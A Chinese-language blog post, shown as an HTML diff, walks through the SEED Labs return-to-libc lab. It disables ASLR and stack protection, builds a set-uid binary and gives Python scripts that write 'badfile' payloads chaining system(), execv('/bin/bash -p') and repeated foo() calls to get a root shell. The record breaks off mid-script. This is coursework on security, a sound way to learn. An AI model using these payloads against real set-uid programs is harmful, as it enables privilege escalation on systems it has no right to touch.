@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		
+<title>Return-to-libc Attack Lab-无限进步</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/image/shengdanwu.png">
+
+<link rel="stylesheet" href="/css/index.css">
+
+
+
+<meta name="keywords" content="Expoilt,ret2libc,">
+<meta name="description" content="实验过程">
+
+
+<script src="/js/jquery.min.js"></script>
+
+
+<script src="/js/index.js"></script>
+
+
+<script src="/js/fancybox.umd.js"></script>
+
+
+<script src="/js/fancybox-images.js"></script>
+
+
+<script src="/js/gitalk.min.js"></script>
+
+
+<script src="/js/hljs.min.js"></script>
+ 
+<script>hljs.highlightAll();</script>
+
+	<meta name="generator" content="Hexo 8.1.1"></head>
+
+	<body>
+		
+	<div class="header">
+		<div class="header-top" id="header-top">
+			<div class="h-left">
+				<a href="/">
+					<img src="/image/shengdanwu.png" alt="Quiet">
+				</a>
+			</div>
+			<div class="h-right">
+				<ul>
+					
+						
+								<li>
+									<a href="/">
+										HOME
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/archives">
+										ARCHIVE
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/categories">
+										CATEGORIES
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/tags">
+										TAGS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/links">
+										LINKS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/about">
+										ABOUT
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+				</ul>
+			</div>
+			<div class="h-right-close">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+					<path fill="none" d="M0 0h24v24H0z" />
+					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
+				</svg>
+			</div>
+		</div>
+	</div>
+	<div class="sidebar">
+    <div class="topo">
+        <h2>Ram</h2>
+    </div>
+    <ul>
+        
+        <li>
+            <a href="/">HOME</a>
+        </li>
+        
+        <li>
+            <a href="/archives">ARCHIVE</a>
+        </li>
+        
+        <li>
+            <a href="/categories">CATEGORIES</a>
+        </li>
+        
+        <li>
+            <a href="/tags">TAGS</a>
+        </li>
+        
+        <li>
+            <a href="/links">LINKS</a>
+        </li>
+        
+        <li>
+            <a href="/about">ABOUT</a>
+        </li>
+        
+    </ul>
+    <div class="my_foot">
+        
+        <a target="_blank" rel="noopener" href="https://github.com/RamBree">
+            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+        </a>
+        
+    </div>
+</div>
+<div class='shelter'>
+</div>
+<style>
+    .shelter{
+        background-color: #333;
+        opacity:0.5;
+        cursor: pointer;
+        display: none; 
+        position: fixed;
+        left: 0;
+        top: 0; 
+        right: 0;
+        bottom: 0;
+        z-index: 1998;
+    }
+    .sidebar {
+        width: 66%;
+        height: 100%;
+        position: fixed;
+        top: 0;
+        right: -100%;
+        bottom: 0;
+        background: #fff;
+        z-index: 1999;
+        text-align: center;
+        box-shadow: -6px 0 20px rgba(98, 94, 94, .815);
+    }
+
+    .topo {
+        width: 100%;
+        height: 200px;
+        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
+        background-size: 100% 100%;
+        position: relative;
+        display: flex;
+        align-items: flex-end
+    }
+
+    .topo h2 {
+        color: #fff;
+        z-index: 1;
+        position: relative;
+        margin: 0 0 10px 10px;
+        font-size: 1.2em;
+        box-sizing: border-box
+    }
+
+    .topo:before {
+        content: '';
+        background-image: url(/image/pattern.png);
+        background-repeat: repeat;
+        height: 100%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        width: 100%;
+        z-index: 1
+    }
+
+    .sidebar ul {
+        width: 100%;
+        margin-top: 50px
+    }
+
+    .sidebar ul li {
+        height: 50px;
+        list-style: none;
+        font-size: 1.2em;
+        text-align: right;
+        margin-right: 10px
+    }
+
+    .sidebar ul li a {
+        display: grid;
+        color: #5d606a;
+        text-overflow: ellipsis;
+        width: 100%;
+        text-decoration: none
+    }
+
+    .my_foot {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        position: absolute;
+        bottom: 0
+    }
+
+    .my_foot a {
+        text-decoration: none;
+        margin-right: 10px;
+        display: inline-block
+    }
+
+    .my_foot a img {
+        width: 30px;
+        height: 30px
+    }
+</style>
+
+<script>
+    $( function () {
+	$( '.h-right-close>svg' )
+		.click( function () {
+			$( '.sidebar' )
+				.animate( {
+					right: "0"
+				}, 500 );
+			$( '.shelter' )
+				.fadeIn( "slow" )
+		} );
+	$( '.shelter' )
+		.click( function ( e ) {
+			$( '.sidebar' )
+				.animate( {
+					right: "-100%"
+				}, 500 );
+			$( '.shelter' )
+				.fadeOut( "slow" )
+		} )
+} )
+
+</script>
+
+<div class="post">
+    <div class="post-header-background post-header-img"
+    style="background: url('/image/demon-slayer-3840x2160-10716.jpg')" 
+>
+    <div class="post-header-background-content">
+        <ul class="post-header-tag">
+            
+            
+            <li><a href="/tags/Expoilt">Expoilt</a></li>
+            
+            <li><a href="/tags/ret2libc">ret2libc</a></li>
+            
+            
+        </ul>
+        
+        <h1>Return-to-libc Attack Lab</h1>
+        <div class="post-header-info">
+            <div class="post-header-info-author">
+                
+                    <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
+                        xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
+                        <path
+                            d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
+                            p-id="2902" fill="#ffffff"></path>
+                    </svg>
+                    
+                <span class="post-header-info-author-text"> <a href="../../about">Ram</a></span>
+                <div class="post-header-info-author-categories">
+                    
+                         <a href="../../categories/SeedLabs2-0/" target="_blank" >SeedLabs2.0</a>
+                    
+                </div>
+                <p>2025-11-04 21:51:09</p>
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="post-content" id="content">
+  
+  <div id="article" class="post-content-info">
+    
+
+    <h1 id="Return-to-libc-Attack-Lab"><a href="#Return-to-libc-Attack-Lab" class="headerlink" title="Return-to-libc Attack Lab"></a>Return-to-libc Attack Lab</h1><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>关闭地址随机化，同时将&#x2F;bin&#x2F;sh 链接到zsh，方便我们攻击。</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029095756588.png" alt="image-20251029095756588"></p>
+<p>编译程序（关闭堆栈保护方案 StackGuard和不可执行堆栈），同时将程序设置为set-uid程序。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># -DBUF_SIZE设置为29，因为实验日期为10.29</span>
+gcc <span class="token parameter variable">-m32</span> <span class="token parameter variable">-DBUF_SIZE</span><span class="token operator">=</span><span class="token number">29</span> -fno-stack-protector <span class="token parameter variable">-z</span> noexecstack <span class="token parameter variable">-o</span> retlib retlib.c
+<span class="token function">sudo</span> <span class="token function">chown</span> root retlib
+<span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">4755</span> retlib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2025/11/04/seedlab2/image-20251029100019023.png" alt="image-20251029100019023"></p>
+<h2 id="Task-1-Finding-out-the-Addresses-of-libc-Functions"><a href="#Task-1-Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task 1: Finding out the Addresses of libc Functions"></a>Task 1: Finding out the Addresses of <strong>libc</strong> Functions</h2><p>使用gdb来调试程序</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029101823942.png" alt="image-20251029101823942"></p>
+<p>设置断点在main函数</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029101956090.png" alt="image-20251029101956090"></p>
+<p>打印system和exit函数的地址</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029102046631.png" alt="image-20251029102046631"></p>
+<h2 id="Task-2-Putting-the-shell-string-in-the-memory"><a href="#Task-2-Putting-the-shell-string-in-the-memory" class="headerlink" title="Task 2: Putting the shell string in the memory"></a>Task 2: Putting the shell string in the memory</h2><p>使用环境变量的方法，将命令字符串<code>/bin/sh</code> 必须首先放入内存中</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029102207354.png" alt="image-20251029102207354"></p>
+<p>编译一个程序打印环境变量。</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029103942580.png" alt="image-20251029103942580"></p>
+<p>打印出了环境变量的地址。</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029104046331.png" alt="image-20251029104046331"></p>
+<h2 id="Task-3-Launching-the-Attack"><a href="#Task-3-Launching-the-Attack" class="headerlink" title="Task 3: Launching the Attack"></a>Task 3: Launching the Attack</h2><p>查看ebp和esp地址</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029111629414.png" alt="image-20251029111629414"></p>
+<p>根据之前的地址填入地址，根据当前的栈桢结构填写偏移。</p>
+ <pre class="line-numbers language-python" data-language="python"><code class="language-python">Y <span class="token operator">=</span> <span class="token number">0xffffd158</span> <span class="token operator">-</span> <span class="token number">0xffffd12f</span> <span class="token operator">+</span> <span class="token number">4</span>
+system_addr <span class="token operator">=</span> <span class="token number">0xf7e0a360</span>   <span class="token comment"># The address of system()</span>
+content<span class="token punctuation">[</span>Y<span class="token punctuation">:</span>Y<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+Z <span class="token operator">=</span> Y <span class="token operator">+</span> <span class="token number">4</span>
+exit_addr <span class="token operator">=</span> <span class="token number">0xf7dfcec0</span>     <span class="token comment"># The address of exit()</span>
+content<span class="token punctuation">[</span>Z<span class="token punctuation">:</span>Z<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+X <span class="token operator">=</span> Z <span class="token operator">+</span> <span class="token number">4</span>
+sh_addr <span class="token operator">=</span> <span class="token number">0xffffd776</span>       <span class="token comment"># The address of "/bin/sh"</span>
+content<span class="token punctuation">[</span>X<span class="token punctuation">:</span>X<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>编译出badfile，攻击成功。</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029112427155.png" alt="image-20251029112427155"></p>
+<h3 id="变种1：修改返回地址"><a href="#变种1：修改返回地址" class="headerlink" title="变种1：修改返回地址"></a>变种1：修改返回地址</h3><p>修改exit地址，我们将其返回到main函数</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">Y <span class="token operator">=</span> <span class="token number">0xffffd158</span> <span class="token operator">-</span> <span class="token number">0xffffd12f</span> <span class="token operator">+</span> <span class="token number">4</span>
+system_addr <span class="token operator">=</span> <span class="token number">0xf7e0a360</span>   <span class="token comment"># The address of system()</span>
+content<span class="token punctuation">[</span>Y<span class="token punctuation">:</span>Y<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+Z <span class="token operator">=</span> Y <span class="token operator">+</span> <span class="token number">4</span>
+exit_addr <span class="token operator">=</span> <span class="token number">0xffffd170</span>     <span class="token comment"># The address of exit()</span>
+content<span class="token punctuation">[</span>Z<span class="token punctuation">:</span>Z<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+X <span class="token operator">=</span> Z <span class="token operator">+</span> <span class="token number">4</span>
+sh_addr <span class="token operator">=</span> <span class="token number">0xffffd776</span>       <span class="token comment"># The address of "/bin/sh"</span>
+content<span class="token punctuation">[</span>X<span class="token punctuation">:</span>X<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发现同样可以成功</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029112544097.png" alt="image-20251029112544097"></p>
+<p>但如果是一个不合法的地址，退出时会崩溃。</p>
+<h3 id="变种2：修改文件名长度"><a href="#变种2：修改文件名长度" class="headerlink" title="变种2：修改文件名长度"></a>变种2：修改文件名长度</h3><p>复制<code>retlib</code>,修改名为<code>newretlib</code>,然后执行，发现不能攻击成功</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029112759998.png" alt="image-20251029112759998"></p>
+<p>若名字长度一样，是能够正常执行的。</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029122649424.png" alt="image-20251029122649424"></p>
+<p>这是因为，在ASLR关闭的情况下，栈的起始地址主要由执行程序的<strong>绝对路径名</strong>决定。修改了易受攻击程序的名字（及其路径）的长度后，改变了栈在内存中的初始地址，从而导致你精心构造的攻击参数（system函数的地址和“&#x2F;bin&#x2F;sh”字符串的地址）不再正确。<em>（来源：deepseek）</em></p>
+<h2 id="Task-4-Defeat-Shell’s-countermeasure"><a href="#Task-4-Defeat-Shell’s-countermeasure" class="headerlink" title="Task 4: Defeat Shell’s countermeasure"></a>Task 4: Defeat Shell’s countermeasure</h2><p>将sh指向dash，发现无法获得root权限。</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029123320599.png" alt="image-20251029123320599"></p>
+<p>找到execv地址</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029184409002.png" alt="image-20251029184409002"></p>
+<p>我们需要写argv数组的地址，我们设置偏移offset，这个偏移是相对main函数的偏移，这样子就得到了argv数组的地址指向main的空间。</p>
+<p>然后需要找到bin&#x2F;bash的地址，开始选择用环境变量的方法，发现没有成功。后面将&#x2F;bin&#x2F;bash-p写入payload中，然后根据payload的偏移来找到&#x2F;bin&#x2F;bash-p的地址。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<span class="token keyword">import</span> sys
+
+<span class="token comment"># Fill content with non-zero values</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0xaa</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+start <span class="token operator">=</span> <span class="token number">0xffffd148</span> <span class="token operator">-</span> <span class="token number">0xffffd11f</span> <span class="token operator">+</span> <span class="token number">4</span>
+execv_addr <span class="token operator">=</span> <span class="token number">0xf7e91420</span>  <span class="token comment"># The address of execv()  </span>
+content<span class="token punctuation">[</span>start<span class="token punctuation">:</span>start<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>execv_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+exit_addr <span class="token operator">=</span> <span class="token number">0xf7dfcec0</span>  <span class="token comment"># The address of exit()</span>
+content<span class="token punctuation">[</span>start<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span>start<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># bin -p</span>
+main_addr <span class="token operator">=</span> <span class="token number">0xffffd160</span>   <span class="token comment"># The address of main()</span>
+sh_offset <span class="token operator">=</span> <span class="token number">0x200</span>
+content<span class="token punctuation">[</span>sh_offset<span class="token punctuation">:</span>sh_offset<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">b'/bin/bash\x00'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span>sh_offset<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">:</span>sh_offset <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">b'-p\x00'</span><span class="token punctuation">)</span>
+bash_addr <span class="token operator">=</span> main_addr <span class="token operator">+</span> sh_offset
+p_addr <span class="token operator">=</span> bash_addr <span class="token operator">+</span> <span class="token number">10</span>
+
+offset <span class="token operator">=</span> <span class="token number">0x100</span>
+agv_addr <span class="token operator">=</span> main_addr <span class="token operator">+</span> offset   <span class="token comment"># The address of argv</span>
+content<span class="token punctuation">[</span>start<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">:</span>start<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bash_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span>start<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">:</span>start<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>agv_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+content<span class="token punctuation">[</span>offset<span class="token punctuation">:</span>offset <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bash_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span>offset<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span>offset <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>p_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span>offset<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">:</span>offset <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+<span class="token comment"># Save content to a file</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+  f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2025/11/04/seedlab2/image-20251030113643059.png" alt="image-20251030113643059"></p>
+<h2 id="Task-5-Optional-Return-Oriented-Programming"><a href="#Task-5-Optional-Return-Oriented-Programming" class="headerlink" title="Task 5 (Optional): Return-Oriented Programming"></a>Task 5 (Optional): Return-Oriented Programming</h2><p>首先找到<code>foo</code>的地址，调用10次foo就是在栈上填10次foo的地址覆盖return address</p>
+<p><img src="/2025/11/04/seedlab2/image-20251029204735705.png" alt="image-20251029204735705"></p>
+<p>之后的步骤同task4，在执行10次foo结束后，用<code>execv()</code>的地址覆盖第10次<code>foo</code>的return address，之后同理，可以获取root权限：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<span class="token keyword">import</span> sys
+
+<span class="token comment"># Fill content with non-zero values</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0xaa</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+start <span class="token operator">=</span> <span class="token number">0xffffd148</span> <span class="token operator">-</span> <span class="token number">0xffffd11f</span> <span class="token operator">+</span> <span class="token number">4</span>
+foo <span class="token operator">=</span> <span class="token number">0x565562b0</span>  <span class="token comment"># The address of foo()</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    content<span class="token punctuation">[</span>start <span class="token operator">+</span> <span class="token number">4</span><span class="token operator">*</span>i<span class="token punctuation">:</span>start<span class="token operator">+</span> <span class="token number">4</span><span class="token operator">*</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+execv_addr <span class="token operator">=</span> <span class="token number">0xf7e91420</span>  <span class="token comment"># The address of execv()  </span>
+content<span class="token punctuation">[</span>start <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">:</span>start<span class="token operator">+</span><span class="token number">44</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>execv_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+exit_addr <span class="token operator">=</span> <span class="token number">0xf7dfcec0</span>  <span class="token comment"># The address of exit()</span>
+content<span class="token punctuation">[</span>start<span class="token operator">+</span><span class="token number">44</span><span class="token punctuation">:</span>start<span class="token operator">+</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># bin -p</span>
+main_addr <span class="token operator">=</span> <span class="token number">0xffffd160</span>   <span class="token comment"># The address of main()</span>
+sh_offset <span class="token operator">=</span> <span class="token number">0x200</span>
+content<span class="token punctuation">[</span>sh_offset<span class="token punctuation">:</span>sh_offset<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">b'/bin/bash\x00'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span>sh_offset<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">:</span>sh_offset <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">b'-p\x00'</span><span class="token punctuation">)</span>
+bash_addr <span class="token operator">=</span> main_addr <span class="token operator">+</span> sh_offset
+p_addr <span class="token operator">=</span> bash_addr <span class="token operator">+</span> <span class="token number">10</span>
+
+offset <span class="token operator">=</span> <span class="token number">0x100</span>
+agv_addr <span class="token operator">=</span> main_addr <span class="token operator">+</span> offset   <span class="token comment"># The address of argv</span>
+content<span class="token punctuation">[</span>start<span class="token operator">+</span><span class="token number">48</span><span class="token punctuation">:</span>start<span class="token operator">+</span><span class="token number">52</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bash_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span>start<span class="token operator">+</span><span class="token number">52</span><span class="token punctuation">:</span>start<span class="token operator">+</span><span class="token number">56</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>agv_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+content<span class="token punctuation">[</span>offset<span class="token punctuation">:</span>offset <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bash_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span>offset<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span>offset <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>p_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span>offset<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">:</span>offset <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+<span class="token comment"># Save content to a file</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
